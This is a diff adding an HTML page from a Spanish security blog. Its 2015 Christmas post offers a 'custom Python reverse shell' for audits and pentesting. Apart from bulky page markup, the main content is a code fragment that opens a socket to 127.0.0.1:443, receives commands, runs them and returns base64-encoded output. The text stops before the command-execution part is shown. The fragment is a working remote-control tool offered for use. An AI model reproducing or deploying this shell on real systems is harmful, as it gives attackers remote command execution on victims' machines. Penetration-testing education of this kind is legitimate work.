@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="es" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Feliz Navidad with Custom Python Reverse Shell - Seguridad para Todos</title>
+  <meta name="description" content="Este año es mi quinta (5) Navidad con vosotros, parece que fuera
+ayer (25/Dic 2011) cuando celebré la primera Navidad con todos vosotros,
+el camino recorrido hasta ahora ha sido gratificante y emocionante, pero
+quizás lo es aún más el camino que queda por recorrer.
+Como es habitual, la intensidad con la que publico artículos se
+encuentra supeditada a la vida misma (y a los deseos de mi pequeña xD),">
+  <meta name="author" content="Julian J Gonzalez"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Seguridad para Todos",
+    
+    "url": "https://st2labs.github.io"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https://st2labs.github.io"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https://st2labs.github.io",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https://st2labs.github.io/post/2015-12-23-feliz-navidad-with-custom-python-reverse-shell/",
+          "name": "Feliz navidad with custom python reverse shell"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Julian J. Gonzalez"
+  },
+  "headline": "Feliz Navidad with Custom Python Reverse Shell",
+  "description" : "Este año es mi quinta (5) Navidad con vosotros, parece que fuera
+ayer (25/Dic 2011) cuando celebré la primera Navidad con todos vosotros,
+el camino recorrido hasta ahora ha sido gratificante y emocionante, pero
+quizás lo es aún más el camino que queda por recorrer.
+Como es habitual, la intensidad con la que publico artículos se
+encuentra supeditada a la vida misma (y a los deseos de mi pequeña xD),",
+  "inLanguage" : "es",
+  "wordCount": 759,
+  "datePublished" : "2015-12-23T10:50:00",
+  "dateModified" : "2015-12-23T10:50:00",
+  "image" : "https://st2labs.github.io/img/st2400x400.jpg",
+  "keywords" : [ "2015, Shell, Python, XMas, ST2Blog, ST2Labs, Base64, Code, Reverse" ],
+  "mainEntityOfPage" : "https://st2labs.github.io/post/2015-12-23-feliz-navidad-with-custom-python-reverse-shell/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https://st2labs.github.io",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https://st2labs.github.io/img/st2400x400.jpg",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Feliz Navidad with Custom Python Reverse Shell" />
+<meta property="og:description" content="Este año es mi quinta (5) Navidad con vosotros, parece que fuera
+ayer (25/Dic 2011) cuando celebré la primera Navidad con todos vosotros,
+el camino recorrido hasta ahora ha sido gratificante y emocionante, pero
+quizás lo es aún más el camino que queda por recorrer.
+Como es habitual, la intensidad con la que publico artículos se
+encuentra supeditada a la vida misma (y a los deseos de mi pequeña xD),">
+<meta property="og:image" content="https://st2labs.github.io/img/st2400x400.jpg" />
+<meta property="og:url" content="https://st2labs.github.io/post/2015-12-23-feliz-navidad-with-custom-python-reverse-shell/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Seguridad para Todos" />
+
+  <meta name="twitter:title" content="Feliz Navidad with Custom Python Reverse Shell" />
+  <meta name="twitter:description" content="Este año es mi quinta (5) Navidad con vosotros, parece que fuera
+ayer (25/Dic 2011) cuando celebré la primera Navidad con todos vosotros,
+el camino recorrido hasta ahora ha sido gratificante y …">
+  <meta name="twitter:image" content="https://st2labs.github.io/img/st2400x400.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@seguridadxato2" />
+  <meta name="twitter:creator" content="@seguridadxato2" />
+  <link href='https://st2labs.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.54.0" />
+  <link rel="alternate" href="https://st2labs.github.io/index.xml" type="application/rss+xml" title="Seguridad para Todos"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://st2labs.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://st2labs.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://st2labs.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-26021994-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Conmuta navegación</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://st2labs.github.io">Seguridad para Todos</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Home" href="/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Posts" href="/post/">Posts</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="/tags">Tags</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Seguridad para Todos" href="https://st2labs.github.io">
+            <img class="avatar-img" src="https://st2labs.github.io/img/st2400x400.jpg" alt="Seguridad para Todos" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>Feliz Navidad with Custom Python Reverse Shell</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Publicado el 23 de enero, 2015
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;4&nbsp;minutos
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;759&nbsp;palabras
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Julian J. Gonzalez
+    
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p><a href="../images/2015-12-23-feliz-navidad-with-custom-python-reverse-shell-Feliz_Navidad.png"><img src="../images/thumbnails/2015-12-23-feliz-navidad-with-custom-python-reverse-shell-Feliz_Navidad.png" alt="" /></a></p>
+
+<p>Este año es mi <strong>quinta (5) Navidad con vosotros,</strong> parece que fuera</p>
+
+<p>ayer (25/Dic 2011) cuando celebré la primera Navidad con todos vosotros,</p>
+
+<p>el camino recorrido hasta ahora ha sido gratificante y emocionante, pero</p>
+
+<p>quizás lo es aún más el camino que queda por recorrer.</p>
+
+<p>Como es habitual, la intensidad con la que publico artículos se</p>
+
+<p>encuentra supeditada a la vida misma (y a los deseos de mi pequeña xD),</p>
+
+<p>el pasado 2014, se me olvido felicitar la Navidad, por lo que este año</p>
+
+<p>me ha parecido que la mejor forma de celebrarlo con vosotros es</p>
+
+<p>compartiendo el código de una shell reversa escrita en python &hellip; que</p>
+
+<p>puede resultar de gran utilidad durante una Auditoria / Pentesting.</p>
+
+<p>Muchas Gracias a todos por seguirme y leer mis publicaciones, no vemos</p>
+
+<p>el año próximo. Feliz Navidad con mis mejores deseos para el año que</p>
+
+<p>viene.</p>
+
+<p><span style="font-size: large;">Custom Python Reverse Shell</span></p>
+
+<p>Code<span style="font-size: x-small;">*</span>:</p>
+
+<table>
+
+<colgroup>
+
+<col style="width: 50%" />
+
+<col style="width: 50%" />
+
+</colgroup>
+
+<tbody>
+
+<tr class="odd">
+
+<td><div class="line number1 index0 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+1
+
+</div>
+
+<div class="line number2 index1 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+2
+
+</div>
+
+<div class="line number3 index2 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+3
+
+</div>
+
+<div class="line number4 index3 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+4
+
+</div>
+
+<div class="line number5 index4 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+5
+
+</div>
+
+<div class="line number6 index5 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+6
+
+</div>
+
+<div class="line number7 index6 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+7
+
+</div>
+
+<div class="line number8 index7 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+8
+
+</div>
+
+<div class="line number9 index8 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+9
+
+</div>
+
+<div class="line number10 index9 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+10
+
+</div>
+
+<div class="line number11 index10 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+11
+
+</div>
+
+<div class="line number12 index11 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+12
+
+</div>
+
+<div class="line number13 index12 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+13
+
+</div>
+
+<div class="line number14 index13 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+14
+
+</div>
+
+<div class="line number15 index14 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+15
+
+</div>
+
+<div class="line number16 index15 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+16
+
+</div>
+
+<div class="line number17 index16 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+17
+
+</div>
+
+<div class="line number18 index17 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+18
+
+</div>
+
+<div class="line number19 index18 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+19
+
+</div>
+
+<div class="line number20 index19 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+20
+
+</div>
+
+<div class="line number21 index20 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+21
+
+</div>
+
+<div class="line number22 index21 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+22
+
+</div>
+
+<div class="line number23 index22 alt2" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+23
+
+</div>
+
+<div class="line number24 index23 alt1" style="background: none white !important; border-radius: 0px !important; border-right-color: rgb(108, 226, 108) !important; border-right-style: solid !important; border-width: 0px 3px 0px 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 0.5em 0px 1em !important; position: static !important; right: auto !important; text-align: right !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+24
+
+</div></td>
+
+<td><div class="container" style="background-attachment: initial !important; background-clip: initial !important; background-image: none !important; background-origin: initial !important; background-position: initial !important; background-repeat: initial !important; background-size: initial !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: relative !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">
+
+<div class="line number1 index0 alt2" style="background: none white !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 1em !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+<code class="sourceCode python" style="background: none !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; color: rgb(0, 102, 153) !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, &#39;Bitstream Vera Sans Mono&#39;, &#39;Courier New&#39;, Courier, monospace !important; font-size: 1em !important; font-weight: bold !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;"><span class="kw">def</span></code> <code class="sourceCode python" style="background: none !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, &#39;Bitstream Vera Sans Mono&#39;, &#39;Courier New&#39;, Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">shell():</code>
+
+</div>
+
+<div class="line number1 index0 alt2" style="background: none white !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 1em !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+<code class="sourceCode python" style="background: none !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, &#39;Bitstream Vera Sans Mono&#39;, &#39;Courier New&#39;, Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;"></code>
+
+</div>
+
+<div class="line number2 index1 alt1" style="background: none white !important; border-radius: 0px !important; border: 0px !important; bottom: auto !important; box-shadow: none !important; box-sizing: content-box !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px 1em !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; white-space: pre !important; width: auto !important;">
+
+   #Base64 encoded reverse shell<br />
+
+   try:<br />
+
+       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
+
+       s.connect(('127.0.0.1', int(443)))<br />
+
+       s.send('[*] Connection Established!')<br />
+
+       while 1:<br />
+
+             cmd = s.recv(1024)<br />
+
+             if cmd == "quit":<br />
+
+                 break<br />
+
+             response = run_cmd(cmd)<br />
+
+             if response:<br />
+
+                 encoded = base64.b64encode(response)<br />
+
+             else:<br />
+
+                 response = 'Running: {}'.format(cmd)<br />
+
+             encoded = base64.b64encode(response)<br />
+
+             s.send(encoded)<br />
+
+    except socket.error:<br />
+
+       sys.exit(2)<br />
+
+    except WindowsError:<br />
+
+       pass<br />
+
+    finally:<br />
+
+       s.close()
+
+</div>
+
+</div></td>
+
+</tr>
+
+</tbody>
+
+</table>
+
+<p>Es un fragmento de como se puede implementar una &ldquo;Shell&rdquo; de conexión</p>
+
+<p>inversa en python de forma sencilla. Falta por supuesto como ejecutar</p>
+
+<p>comandos en el sistema:</p>
+
+<table>
